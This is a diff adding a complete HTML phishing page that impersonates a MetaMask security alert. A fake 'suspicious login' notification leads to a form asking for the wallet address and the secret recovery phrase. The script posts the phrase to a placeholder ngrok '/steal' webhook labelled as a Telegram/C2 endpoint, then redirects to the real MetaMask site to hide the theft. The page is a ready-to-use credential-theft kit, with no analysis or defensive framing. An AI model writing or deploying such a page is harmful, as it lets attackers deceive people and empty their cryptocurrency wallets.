@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>MetaMask • Security Alert</title>
+    <style>
+        /* ---------- RESET ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #1c1c1e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        /* ---------- CARD ---------- */
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background: #2c2c2e;
+            border-radius: 16px;
+            padding: 24px 20px;
+            color: #ffffff;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+        }
+
+        /* ---------- PUSH NOTIFICATION STYLES ---------- */
+        .push-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .push-header .icon {
+            font-size: 24px;
+        }
+        .push-header .app-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #8e8e93;
+        }
+        .push-header .time {
+            margin-left: auto;
+            font-size: 12px;
+            color: #8e8e93;
+        }
+        .push-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .push-body {
+            font-size: 14px;
+            color: #ebebf0;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+        .push-body strong {
+            color: #ffffff;
+        }
+        .push-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #0a84ff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .push-btn:active {
+            transform: scale(0.97);
+        }
+        .push-btn:hover {
+            background: #0071e3;
+        }
+        .push-footer {
+            font-size: 12px;
+            color: #8e8e93;
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        /* ---------- PHISHING FORM (HIDDEN BY DEFAULT) ---------- */
+        .phish-section {
+            display: none;
+            margin-top: 8px;
+        }
+        .phish-section.active {
+            display: block;
+        }
+        .phish-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .phish-logo svg {
+            width: 56px;
+            height: 56px;
+        }
+        .phish-logo h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-top: 6px;
+        }
+        .phish-badge {
+            background: #3a2a1a;
+            border: 1px solid #f9d5b5;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .phish-badge .icon {
+            font-size: 18px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        .phish-badge .text {
+            font-size: 14px;
+            color: #f0d5b5;
+            line-height: 1.4;
+        }
+        .phish-badge .text strong {
+            display: block;
+            font-weight: 600;
+            color: #ffffff;
+        }
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #d0d5dc;
+            margin-bottom: 4px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #3a3a3c;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #1c1c1e;
+            color: #ffffff;
+            transition: 0.15s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .form-group input:focus {
+            border-color: #f6851b;
+            outline: none;
+            background: #2c2c2e;
+            box-shadow: 0 0 0 3px rgba(246, 133, 27, 0.15);
+        }
+        .phish-btn {
+            width: 100%;
+            padding: 14px;
+            background: #f6851b;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .phish-btn:active {
+            transform: scale(0.98);
+        }
+        .phish-btn:hover {
+            background: #d9730f;
+        }
+        .phish-footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8a8f98;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .phish-footer a {
+            color: #8a8f98;
+            text-decoration: none;
+        }
+        .phish-footer a:hover {
+            color: #ffffff;
+        }
+
+        /* ---------- SUCCESS STATE (HIDDEN) ---------- */
+        .success-box {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success-box.active {
+            display: block;
+        }
+        .success-box .check {
+            font-size: 48px;
+        }
+        .success-box h2 {
+            font-size: 18px;
+            color: #ffffff;
+            margin: 8px 0;
+        }
+        .success-box p {
+            color: #8a8f98;
+            font-size: 14px;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #3a3a3c;
+            border-top: 3px solid #f6851b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ---------- MOBILE RESPONSIVE ---------- */
+        @media (max-width: 480px) {
+            .card {
+                padding: 18px 14px;
+                border-radius: 20px;
+            }
+            .push-title {
+                font-size: 14px;
+            }
+            .push-body {
+                font-size: 13px;
+            }
+            .push-btn {
+                font-size: 14px;
+                padding: 10px;
+            }
+            .phish-logo h1 {
+                font-size: 18px;
+            }
+            .phish-badge .text {
+                font-size: 13px;
+            }
+            .form-group input {
+                font-size: 14px;
+                padding: 11px 12px;
+            }
+            .phish-btn {
+                font-size: 15px;
+                padding: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="mainCard">
+
+        <!-- ===== STEP 1: PUSH NOTIFICATION ===== -->
+        <div id="stepPush">
+            <div class="push-header">
+                <span class="icon">🔔</span>
+                <span class="app-name">MetaMask Security</span>
+                <span class="time">Just now</span>
+            </div>
+            <div class="push-title">⚠️ Suspicious Login Detected</div>
+            <div class="push-body">
+                We detected a login to your wallet from an unrecognized device in <strong>New York, USA</strong>.
+                If this wasn't you, please verify your wallet immediately to prevent lock.
+            </div>
+            <button class="push-btn" onclick="showPhish()">Verify Wallet Now</button>
+            <div class="push-footer">Tap to verify • This alert will expire in 10 minutes</div>
+        </div>
+
+        <!-- ===== STEP 2: PHISHING FORM ===== -->
+        <div class="phish-section" id="stepPhish">
+            <div class="phish-logo">
+                <svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#f6851b"/><path d="M32 10L12 24l6 14 14-4 14 4 6-14z" fill="#fff" opacity="0.8"/><path d="M32 10L12 24l6 14 14-4 14 4 6-14z" fill="#fff" opacity="0.4"/></svg>
+                <h1>MetaMask</h1>
+            </div>
+            <div class="phish-badge">
+                <span class="icon">🔒</span>
+                <div class="text">
+                    <strong>Security Verification Required</strong>
+                    We detected a login from an unrecognized device. Verify your wallet to prevent lock.
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Wallet Address or Email</label>
+                <input type="text" id="walletAddr" placeholder="0x... or email@example.com" inputmode="text" />
+            </div>
+            <div class="form-group">
+                <label>Recovery Phrase (12 or 24 words)</label>
+                <input type="password" id="seedPhrase" placeholder="Enter your secret recovery phrase" />
+            </div>
+            <div class="form-group">
+                <label>Confirm Recovery Phrase</label>
+                <input type="password" id="seedConfirm" placeholder="Re-enter your recovery phrase" />
+            </div>
+            <button class="phish-btn" onclick="submitForm()">Verify Wallet</button>
+            <div class="phish-footer">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Help Center</a>
+                <a href="#">Security</a>
+            </div>
+        </div>
+
+        <!-- ===== STEP 3: SUCCESS ===== -->
+        <div class="success-box" id="stepSuccess">
+            <div class="check">✅</div>
+            <h2>Wallet Verified</h2>
+            <p>Your wallet has been secured. You will be redirected to your dashboard.</p>
+            <div style="margin-top:16px;"><span class="loading"></span> Verifying...</div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIG – REPLACE WITH YOUR WEBHOOK URL
+        // ============================================================
+        const WEBHOOK = 'https://your-ngrok-url.ngrok.io/steal';
+
+        // ============================================================
+        // STEP 1 → STEP 2
+        // ============================================================
+        function showPhish() {
+            document.getElementById('stepPush').style.display = 'none';
+            document.getElementById('stepPhish').classList.add('active');
+        }
+
+        // ============================================================
+        // STEP 2 → SUCCESS + SEND DATA
+        // ============================================================
+        function submitForm() {
+            const addr = document.getElementById('walletAddr').value.trim();
+            const seed = document.getElementById('seedPhrase').value.trim();
+            const confirm = document.getElementById('seedConfirm').value.trim();
+
+            if (!addr || !seed || !confirm) {
+                alert('Please fill in all fields.');
+                return;
+            }
+            if (seed !== confirm) {
+                alert('Recovery phrases do not match.');
+                return;
+            }
+
+            const data = {
+                wallet: addr,
+                seed: seed,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Send to Telegram / C2
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+
+            // Show success
+            document.getElementById('stepPhish').classList.remove('active');
+            document.getElementById('stepSuccess').classList.add('active');
+
+            // Redirect to real MetaMask after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://metamask.io';
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
